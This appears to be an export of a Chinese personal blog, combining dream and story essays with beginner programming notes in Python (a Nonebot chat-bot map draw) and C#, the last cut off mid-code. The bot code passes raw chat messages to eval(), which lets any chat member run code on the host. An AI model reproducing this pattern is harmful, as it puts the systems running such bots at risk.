    <content><![CDATA[<p>忘记了是什么原因，也许是受人指使。我来到了一个酷似刑房的地方，这个刑房架在高空中，我必须踩着纤细木条移动，就像在走独木桥一样。我跳上的绞肉机上方的木条，从断头台走过到了另一端，面前只剩下了几个更为纤细和脆弱的木条在眼前。我明白，我必须踩着木条移动过去。眼前纤细的木条飘在空中我没有半分的惊诧。我义无反顾的走了上去，快速的到了最纤细的那根上，也是最后的一根，眼前没有了道路，脚下是深渊。而木条在我踩上去顷刻之间便如被咬碎的花生糖一般变成碎片，虽然花生糖这个形容并不恰当，但我感觉这些最贴合的【口感】。紧接着，我向下坠落而去，坠下深渊。下方是数不清的触手，神秘莫幻的色彩，以及我无法形容出来的，潜藏在阴影之中的生物。但我没有完全的坠下去，我落到了深渊中心的木条上，我紧紧的抱着木条，而木条的两端似乎和这个世界的天空有绳索相连，就这样我抱着木条缓缓地向下，越来越接近怪物。终于我直视了一眼天空，却只看到早已经被如海葵般舞动的触手遮挡了起来。触手是黑暗主色调的，却又掺杂着一丝光亮的彩色。全程中毫无恐惧之意，似乎一切都理所当然。而到达深渊底部后的一些记忆全部都缺失，我不明白发生了什么。今天的故事，就此收尾。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>梦境</tag>
        <tag>故事</tag>
      </tags>
  </entry>
  <entry>
    <title>包子店的童话</title>
    <url>/2023/03/14/2023-3-14-%E5%8C%85%E5%AD%90%E5%BA%97%E7%9A%84%E7%AB%A5%E8%AF%9D/</url>
    <content><![CDATA[<p>从前有一家包子店，包子物美价廉，但在噪杂的城市中并不显眼，生意平平。有一天，老板娘抱怨道：“只靠卖包子，什么时候才能赚够买房的钱啊？”老板顿了顿，说道：“只要一直卖下去，好好的包包子，肯定能赚够的。“虽后看了看店铺里冷清的现状，自言自语般的说道：”能卖一百万份包子，就好了。”</p>
<p>有一天，店里来了个奇怪的客人。穿着黑色的西装，戴着礼帽，像是从电影里走出来似的。最奇怪的一点是，无论老板怎么看他，都无法看清他的脸，简直是活见鬼了。老板强装淡定，认为自己一定是老花眼了，笑着问道：“个人，来吃包子吗？”</p>
<p>“不错不错，但我要的量有点大，不知道你们这小店吃不吃得下。”西装男以一副奇怪沙哑的嗓音开口，向着包子店的老板说道。</p>
<p>“放心放心，我们店虽小，但我们可勤快了，不知道客人您要多少包子。”老板心中一喜，连忙答应下来，询问道。</p>
<p>“这张支票你先拿着，明天开始我每天都来吃包子，你包够够我吃的即可。”西装男丢出一张支票，支票像变魔术似的，顺着风飘进了老板的口袋。</p>
<p>包子铺老板拿出支票一看，顿时吓了一跳，上面竟然有一大串的零。“个，拾，佰，仟，万，拾万，佰万，竟然有五…”老板激动的差点喊出来，看了一眼店铺里还在吃饭的食客，发现没有人注意到自己后，将支票收了起来，拿起毛巾擦了擦头上因为激动流出来的汗水。</p>
<p>“老婆，帮我看着点店，我出去办点事。”老板对厨房里忙活的妻子吩咐道，听到妻子嗯了一声后，急匆匆的打D来到了银行。</p>
<p>“先生，请问有什么需要帮助的吗？”</p>
<p>“我要兑支票。”</p>
<p>手续办的很快，在兑现完成后银行的工作人员给他推荐了一堆的投资和理财的业务，还有种种福利之类的，听的老板晕头转向。待到出了银行大门才回过神来，赶紧看了一眼自己的手机银行，一查，真的多了五百万，自己从未有过这么多钱！这一切让老板有些精神恍惚。久违的打了个平时不肯轻易坐的出租车回到了包子店。</p>
<p>老板强忍着，没有告诉妻子这个消息，担心钱财外露遭到觊觎。并且西装男的请求还没有完成，让老板心里有些没底，什么叫包够够他吃的包子，老板猜想肯定没有那么简单，便决定今晚多包50笼包子。心想：“这下肯定够吃的了吧。”</p>
<p>未完待续…</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>故事</tag>
        <tag>童话</tag>
      </tags>
  </entry>
  <entry>
    <title>饺子店的童话</title>
    <url>/2023/03/14/2023-3-14-%E9%A5%BA%E5%AD%90%E5%BA%97%E7%9A%84%E7%AB%A5%E8%AF%9D/</url>
    <content><![CDATA[<p>从前有一家饺子店，饺子物美价廉，但在噪杂的城市中并不显眼，生意平平。有一天，老板娘抱怨道：“只靠卖饺子，什么时候才能赚够买房的钱啊？”老板顿了顿，说道：“只要一直卖下去，好好的包饺子，肯定能赚够的。“虽后看了看店铺里冷清的现状，自言自语般的说道：”能卖一百万份饺子，就好了。”</p>
<p>有一天，店里来了个奇怪的客人。穿着黑色的西装，戴着礼帽，像是从电影里走出来似的。最奇怪的一点是，无论老板怎么看他，都无法看清他的脸，简直是活见鬼了。老板强装淡定，认为自己一定是老花眼了，笑着问道：“个人，来吃饺子吗？”</p>
<p>“不错不错，但我要的量有点大，不知道你们这小店吃不吃得下。”西装男以一副奇怪沙哑的嗓音开口，向着饺子店的老板说道。</p>
<p>“放心放心，我们店虽小，但我们可勤快了，不知道客人您要多少饺子。”老板心中一喜，连忙答应下来，询问道。</p>
<p>“这张支票你先拿着，明天开始我每天都来吃饺子，你包够够我吃的即可。”西装男丢出一张支票，支票像变魔术似的，顺着风飘进了老板的口袋。</p>
<p>饺子铺老板拿出支票一看，顿时吓了一跳，上面竟然有一大串的零。“个，拾，佰，仟，万，拾万，佰万，竟然有五…”老板激动的差点喊出来，看了一眼店铺里还在吃饭的食客，发现没有人注意到自己后，将支票收了起来，拿起毛巾擦了擦头上因为激动流出来的汗水。</p>
<p>“老婆，帮我看着点店，我出去办点事。”老板对厨房里忙活的妻子吩咐道，听到妻子嗯了一声后，急匆匆的打D来到了银行。</p>
<p>“先生，请问有什么需要帮助的吗？”</p>
<p>“我要兑支票。”</p>
<p>手续办的很快，在兑现完成后银行的工作人员给他推荐了一堆的投资和理财的业务，还有种种福利之类的，听的老板晕头转向。待到出了银行大门才回过神来，赶紧看了一眼自己的手机银行，一查，真的多了五百万，自己从未有过这么多钱！这一切让老板有些精神恍惚。久违的打了个平时不肯轻易坐的出租车回到了饺子店。</p>
<p>老板强忍着，没有告诉妻子这个消息，担心钱财外露遭到觊觎。并且西装男的请求还没有完成，让老板心里有些没底，什么叫包够够他吃的饺子，老板猜想肯定没有那么简单，便决定今晚多包50笼饺子。心想：“这下肯定够吃的了吧。”</p>
<p>未完待续…</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>故事</tag>
        <tag>童话</tag>
      </tags>
  </entry>
  <entry>
    <title>孤独与爱</title>
    <url>/2023/03/15/2023-3-15-%E5%AD%A4%E7%8B%AC%E4%B8%8E%E7%88%B1/</url>
    <content><![CDATA[<p>如今的我，已经不再去问那是非对错。回归以往的故事，熄灭的是怒火，感受到的是凄凉。错误的付出，是错付，也不是错付。痛苦与悲伤，寂寞与孤独，充斥我的灵魂，使我麻木。逃避，不敢面对，自我慰藉。又因友人的鼓励，在劝告的话语中，在一步步的艰难的抉择中，我逐渐的找回勇气。得到的，是出乎预料的回答。心里的石头终于落地，呼吸也开始舒畅。但即便如此，我也仍然无法摆脱这份我自己选择的孤独，与世界疏离，收敛我的心性，长此以往。我寻觅着，又不敢触碰，远观着，幻想着，背驰而去，回到我的孤独之中去。</p>
<p>出乎意料的，一次偶然，联系又再次产生。我小心翼翼的，我观察着，不敢奢求的，深深的将爱隐藏着，只希望陪伴能够长久，未来能有未来。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>使用got装饰器制作比赛抽图系统</title>
    <url>/2023/03/24/2023-3-24-%5BNonebot%5D-%E4%BD%BF%E7%94%A8got%E8%A3%85%E9%A5%B0%E5%99%A8%E5%88%B6%E4%BD%9C%E6%AF%94%E8%B5%9B%E6%8A%BD%E5%9B%BE%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><p>说实话，这段代码并不完美，got装饰器有专门的获取消息的方法，而我仍然在使用获取事件消息的方式。</p>
<p>而这种实现方法最明显的缺陷就是无法在群聊以外的环境中使用。</p>
<p>阅读了其他人的代码后，我深感自己的代码水平还是太低。尽管投机取巧的实现了一些功能，但很明显的存在诸多的缺陷。</p>
<p>我将在接下来的时间内多多参考佬们的代码，也更多的去理解Python。汲取前人的智慧，追寻前辈的脚步，而不是一直通过自己的方法闭门造车。</p>
<p>统计一下存在缺陷的功能：</p>
<p>​	教学系统：大量的使用json文件，占用的资源太多</p>
<p>​	持续性会话系统：发送了空消息，影响PC用户的使用</p>
<p>​	比赛系统：代码不完美</p>
<p>​	抽图系统：代码重复性高，宛若屎山</p>
<p>​	帮助系统：同上</p>
<p>总结：菜！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> nonebot <span class="keyword">import</span> on_command</span><br><span class="line"><span class="keyword">from</span> nonebot.adapters.onebot.v11 <span class="keyword">import</span> MessageSegment, Event</span><br><span class="line"><span class="keyword">from</span> nonebot.matcher <span class="keyword">import</span> Matcher</span><br><span class="line"><span class="keyword">from</span> nonebot.adapters <span class="keyword">import</span> Message</span><br><span class="line"><span class="keyword">from</span> nonebot.params <span class="keyword">import</span> CommandArg</span><br><span class="line"></span><br><span class="line">MatchMap = on_command(<span class="string">&#x27;比赛抽图模式启动&#x27;</span>, priority=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@MatchMap.handle()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_first_receive</span>(<span class="params">matcher: Matcher, args: Message = CommandArg(<span class="params"></span>)</span>):</span><br><span class="line">    plain_text = args.extract_plain_text()</span><br><span class="line">    <span class="keyword">if</span> plain_text:</span><br><span class="line">        matcher.set_arg(<span class="string">&quot;Map&quot;</span>, args)</span><br><span class="line">        <span class="comment"># 设置一个got消息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里Ban图</span></span><br><span class="line">MapList = os.listdir(os.getcwd() + <span class="string">&quot;/love/data/images/match/&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@MatchMap.got(<span class="params"><span class="string">&quot;Map&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">              prompt=<span class="string">f&quot;当前地图池为<span class="subst">&#123;<span class="built_in">str</span>(MapList).replace(<span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;&#x27;</span>)&#125;</span>\nBan图指【BanXXX】\nBan图结束请发送【开始抽图】&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_func</span>(<span class="params">event: Event</span>):</span><br><span class="line">    <span class="comment"># async def handle_city(Map: Message = Arg(), BanMap: str = ArgPlainText(&quot;Map&quot;)):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        MapName = <span class="built_in">str</span>(event.get_message()).replace(<span class="string">&#x27;Ban&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> MapName != <span class="string">&#x27;开始抽图&#x27;</span>:</span><br><span class="line"></span><br><span class="line">            MapList.remove(MapName + <span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">await</span> MatchMap.reject(<span class="string">&quot;Ban图成功，地图池中还有：&quot;</span> + <span class="built_in">str</span>(MapList).replace(<span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">await</span> MatchMap.send(<span class="string">&quot;Ban图结束，最终地图池中还有：&quot;</span> + <span class="built_in">str</span>(MapList).replace(<span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;这些地图&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">await</span> MatchMap.reject(<span class="string">&quot;请检查指令是否正确~&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@MatchMap.got(<span class="params"><span class="string">&quot;Number&quot;</span>, prompt=<span class="string">f&quot;请发送需要抽取地图的数量，如果抽1张图请发送 1 。&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_func</span>(<span class="params">event: Event</span>):</span><br><span class="line">    Number = <span class="built_in">eval</span>(<span class="built_in">str</span>(event.get_message()))</span><br><span class="line">    output_list = []</span><br><span class="line">    <span class="comment"># 判断数字大于列表索引就重来</span></span><br><span class="line">    <span class="comment"># try:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(output_list) &lt; Number:</span><br><span class="line"></span><br><span class="line">        MapN = random.choice(MapList)  <span class="comment"># 返回列表中的随机项</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> MapN <span class="keyword">not</span> <span class="keyword">in</span> output_list:</span><br><span class="line">            message = MapN</span><br><span class="line"></span><br><span class="line">            path = Path(os.getcwd() + <span class="string">f&quot;/love/data/images/match/<span class="subst">&#123;MapN&#125;</span>&quot;</span>).parent / <span class="string">f&quot;<span class="subst">&#123;MapN&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">            image = MessageSegment.image(path)</span><br><span class="line"></span><br><span class="line">            output_list.append(MapN)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">await</span> MatchMap.send(<span class="string">&quot;呐呐~你抽到的地图为：&quot;</span> + message.replace(<span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + image)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> MatchMap.finish(<span class="string">&quot;抽图结束，祝您比赛愉快&quot;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Nonebot</tag>
      </tags>
  </entry>
  <entry>
    <title>被if语句给予一点小小震撼</title>
    <url>/2023/03/19/2023-3-19-%E8%A2%ABif%E8%AF%AD%E5%8F%A5%E7%BB%99%E4%BA%88%E4%B8%80%E7%82%B9%E5%B0%8F%E5%B0%8F%E9%9C%87%E6%92%BC/</url>
    <content><![CDATA[<p>#被if语句给予一点小小震撼</p>
<p>为什么是and 而不是or?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">QQ=<span class="number">1252</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(QQ) != <span class="number">3345483363</span> <span class="keyword">or</span> <span class="built_in">int</span>(QQ) != <span class="number">2060598058</span>:</span><br></pre></td></tr></table></figure>
<p>如果QQ号不等于3345483363或2060598058就是错误的，否则就输出正确的。
但是实际情况却是，QQ为任何数字都会错误！…而换成and就能达到我想要的效果，可and不是和吗？ 
or不是两边任何一个返回为真则为真吗，而and不是两边都为真才为真吗？啊啊啊，为森么
然后我踏马就想通了，如果QQ不等于前者，就返回一个真了，我需要的是两个其中一个是假则返回假。
卧槽</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;错误的&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正确的&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 模块重载</title>
    <url>/2023/03/06/2023-3-6%20234624-Python%E7%9A%84%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>在使用Nonebot框架进行的开发中，我接触到了许多新的概念，也了解了更多知识。
大概有，如下：</p>
<ul>
<li>async 异步语句</li>
<li>python程序模块化的更深概念</li>
<li>线程的阻塞</li>
<li>装饰器</li>
<li>json数据的处理</li>
<li>类的实际使用</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>关于Gitee搭建Page的一些注意事项</title>
    <url>/2023/03/06/2023-3-6-%E5%85%B3%E4%BA%8EGitee%E6%90%AD%E5%BB%BAHexo%E7%9A%84%E9%9A%8F%E7%AC%94/</url>
    <content><![CDATA[<h1 id="关于Gitee搭建Page的一些注意事项"><a href="#关于Gitee搭建Page的一些注意事项" class="headerlink" title="关于Gitee搭建Page的一些注意事项"></a>关于Gitee搭建Page的一些注意事项</h1><p>此文章专门为从Github使用者转国内Gitee开源平台的人而写，作者纯小白，如有误区欢迎指正。
此前我的个人博客部署在Github，但因地域问题国内访问速度太过尴尬，在发现国内开源社区后我便探寻有无类似的功能，答案是有的。但在探寻的过程中我发现一些差异，与国外的Github并不是完全一样，也因此踩了不少坑。故写下此文章，希望能帮到有类似情况的人，也便于我进行记忆。
整个步骤一共分为三步：
        0. 实名认证（国内政策需要）
        1. 建立代码仓：我们需要代码仓储存我们静态网站的源代码文件
        2. 开源代码仓：Gitee已停止对闭源代码仓提供Page服务
        3. 在PUSH完成后在Page服务页面进行选择更新
 看似几乎没有区别，仅仅多了第0步和第3步，其实每一步的背后都有着存在的意义。
 主要踩坑还是第三步，因为github的Page页面是实时的更新的，会自动的读取代码仓中的内容。而Gitee必须选择手动提交，以至于我因为用惯了Github，便在测试的时候反复刷新页面和Push代码，一直没找到问题。</p>
<h2 id="关于误区"><a href="#关于误区" class="headerlink" title="关于误区"></a>关于误区</h2><p>网上的几乎都是以自己名字当作代码仓运行GiteePage的教程，甚至有的教程说不可以在其他名称的仓库搭建hexo架构的博客。后者简直是误人子弟，我这个博客便是最好的证明。
 只需要解决其中一个小细节即可，那就是修改 _config.yml 之中的文件</p>
<pre><code class="yml">    index_generator:
  path: &#39;myblog&#39;
  per_page: 10
  order_by: -date




&amp;ensp修改path的字符串为仓库名称即可，实际上path指向的是网站开始的目录。


---

经过实践证明以上纯几把扯淡！！！！！！！！！！！

##最后一点
Gitee有一套审查系统，会在网站进行部署/更新的时候，检查网页中是否含有敏感内容，若是出现则无法通过审核会自动的终止部署。







</code></pre>
]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>浅尝C艹艹</title>
    <url>/2023/03/15/2023-3-6-%E6%B5%85%E5%B0%9DC%E8%89%B9%E8%89%B9/</url>
    <content><![CDATA[<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.Win32;</span><br><span class="line"><span class="keyword">using</span> System;<span class="comment">//unsing指令 让我们的程序包含System的应用空间</span></span><br><span class="line"><span class="keyword">using</span> System.Threading.Channels;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">HelloWorldApplication</span> &#123;<span class="comment">//声明了一个 命名空间</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Recttangle</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">double</span> length;</span><br><span class="line">        <span class="built_in">double</span> width;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Acceptdetails</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            length = <span class="number">4.5</span>;</span><br><span class="line">            width = <span class="number">3.5</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">double</span> <span class="title">GetArea</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> length * width;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Display</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Length:&#123;0&#125;&quot;</span>, length);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Width:&#123;0&#125;&quot;</span>, width);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Area:&#123;0&#125;&quot;</span>, GetArea());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Helloworld</span><span class="comment">//声明了一个 类</span></span><br><span class="line">    &#123;                <span class="comment">//</span></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)<span class="comment">//这里是Main方法，C#程序的入口点</span></span></span><br><span class="line">        &#123;       <span class="comment">//顺带一提，Static 是静态 Void是空，也就输静态空</span></span><br><span class="line">            <span class="comment">//为什么用静态空？原因很简单，这里是主方法，TA不需要返回任何值给谁，所以使用静态空</span></span><br><span class="line">            <span class="comment">/* C#练习 */</span></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;你好，C#！&quot;</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;你好，Visual Studio!&quot;</span>);</span><br><span class="line">            <span class="comment">//vs直接敲cw就可以出现 Console.WriteLine了</span></span><br><span class="line">            <span class="comment">//WriteLine 是一个定义在 System 命名空间中的 Console 类的一个方法</span></span><br><span class="line">            Recttangle r = <span class="keyword">new</span> Recttangle();<span class="comment">//实例化这个类  盲猜是因为同一文件，所以就可以直接实例化上面那个类</span></span><br><span class="line">            r.Acceptdetails();<span class="comment">//调用方法</span></span><br><span class="line">            r.Display();<span class="comment">//方法</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//C#的数据类型</span></span><br><span class="line">            <span class="comment">//bool byte char decimal double float int long sbyte short uint ulong ushort</span></span><br><span class="line">            <span class="comment">//无符号整数被减会怎么样呢？</span></span><br><span class="line">            <span class="comment">//不同类型的数字可以一起运算吗？</span></span><br><span class="line">            <span class="built_in">bool</span> BoolOne = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">byte</span> ByteOne = <span class="number">6</span>, ByteTwo = <span class="number">5</span>;</span><br><span class="line">            <span class="built_in">char</span> CharOne = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="built_in">char</span> CharTwo = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">            <span class="built_in">decimal</span> DecimalOne = <span class="number">0.0</span>M;</span><br><span class="line">            <span class="built_in">double</span> DoubleOne = <span class="number">111.111</span>;</span><br><span class="line">            <span class="built_in">float</span> FloatOne = <span class="number">111.111F</span>;</span><br><span class="line">            <span class="built_in">int</span> IntOne = <span class="number">111</span>;</span><br><span class="line">            <span class="built_in">long</span> LongOne = <span class="number">111</span>;</span><br><span class="line">            <span class="built_in">sbyte</span> SbyleOne = <span class="number">127</span>;</span><br><span class="line">            <span class="built_in">short</span> ShortOne = <span class="number">3456</span>;</span><br><span class="line">            <span class="built_in">uint</span> UintOne = <span class="number">111</span>;</span><br><span class="line">            <span class="built_in">ulong</span> ulongOne = <span class="number">222</span>;</span><br><span class="line">            <span class="built_in">ushort</span> ushortOne = <span class="number">333</span>;</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;这是布尔类型:&quot;</span>+BoolOne);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;这是byte类型：&quot;</span>+ByteOne+ByteTwo);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;这是字符类型:&quot;</span>+CharOne+CharTwo);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;这是decimal类型：&quot;</span>+DecimalOne);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;这是Double类型：&quot;</span>+DoubleOne);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;这是Folat类型：&quot;</span>+FloatOne);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;这是Int类型：&quot;</span>+IntOne);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;这是long类型：&quot;</span>+LongOne);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;这是sbyte类型：&quot;</span>+SbyleOne);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;这是short类型：&quot;</span>+ShortOne);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;这是unit类型：&quot;</span>+UintOne);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;这是ulong类型:&quot;</span>+ulongOne);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;这是ushort类型:&quot;</span>+ushortOne);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;\n&quot;</span>);<span class="comment">//由于本身WirteLine就自动带一个\n，这样子就一下子空两行了。</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">double</span> DoubleThree = <span class="number">3.3333</span>;</span><br><span class="line">            <span class="comment">//先声明再初始化是良好的写法。</span></span><br><span class="line">            <span class="built_in">int</span> NumberOne;</span><br><span class="line">            <span class="built_in">int</span> NumberTwo;</span><br><span class="line">            <span class="built_in">int</span> NumberThree;</span><br><span class="line"></span><br><span class="line">            NumberOne=<span class="number">111</span>;</span><br><span class="line">            NumberTwo=<span class="number">222</span>;</span><br><span class="line">            NumberThree=<span class="number">333</span>;</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;随便输出几个数字:&quot;</span>+NumberOne+NumberTwo+NumberThree);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;随便输出一个强制类型转换的数字:&quot;</span>+(<span class="built_in">int</span>)DoubleThree);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;输出字符串&#123;0&#125;&quot;</span>, <span class="string">&quot;啊输出字符串&quot;</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;浅记一下逻辑运算符：&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">bool</span> BoolTwo = <span class="literal">false</span>;</span><br><span class="line">            <span class="built_in">bool</span> BoolThree = <span class="literal">false</span>;</span><br><span class="line">            <span class="built_in">bool</span> BoolFour = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (NumberThree&gt;NumberTwo)</span><br><span class="line">            &#123;</span><br><span class="line">                BoolTwo = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (NumberTwo&gt;NumberOne)</span><br><span class="line">            &#123;</span><br><span class="line">                BoolFour = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Console.WriteLine(BoolFour&amp;&amp;BoolTwo);</span><br><span class="line">            Console.WriteLine(BoolFour&amp;&amp;BoolThree);</span><br><span class="line">            Console.WriteLine(BoolFour||BoolThree);</span><br><span class="line">            Console.WriteLine(!(BoolTwo &amp;&amp; BoolThree));</span><br><span class="line">            <span class="comment">//差不多就这样了 ，接下来是位运算</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//One = 0011 1100</span></span><br><span class="line">            <span class="comment">//Two = 0000 1101</span></span><br><span class="line">            <span class="built_in">int</span> BitwiseNumberOne = <span class="number">60</span>;</span><br><span class="line">            <span class="built_in">int</span> BitwiseNumberTwo = <span class="number">13</span>;</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(BitwiseNumberOne&amp;BitwiseNumberTwo);<span class="comment">// 0000 1100 对每位执行AND运算符</span></span><br><span class="line">            Console.WriteLine(BitwiseNumberOne|BitwiseNumberTwo);<span class="comment">// 0011 1101 对每位执行OR运算符</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//什么是AND运算符 1 AND 1 = 1 1 AND 0 = 0 0 AND 1 = 0 0 AND 0 = 0</span></span><br><span class="line">            <span class="comment">//什么是OR运算符  1 OR 1 = 1 1 OR 0 = 1 0 OR 1 = 1 O OR O = 0</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//浅浅的写一下switch语句</span></span><br><span class="line">            <span class="built_in">int</span> NumberFive = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">switch</span> (NumberFive)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;这个数字是1&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;传透过来了。&quot;</span>);<span class="comment">//这里像写一下穿透的示例，但是C#居然是禁止穿透的，233333</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;但是问题不大哦&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="literal">default</span>:</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;233333&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">//如果不满足以上任何标签的条件，则执行default块的内容</span></span><br><span class="line">                    <span class="comment">//switch语句最后一行也要记得加break语句，否则无法脱离开关</span></span><br><span class="line">                    <span class="comment">//是否可以return一个函数呢？</span></span><br><span class="line">            &#125;       <span class="comment">//我认为是有可能的。</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (NumberFive)<span class="comment">//这里填变量就不会出现这个错误，如果直接填数字，编译器则会发现一个多余的case代码，它是不会被执行的，所以就会报一个警告</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    Console.WriteLine(<span 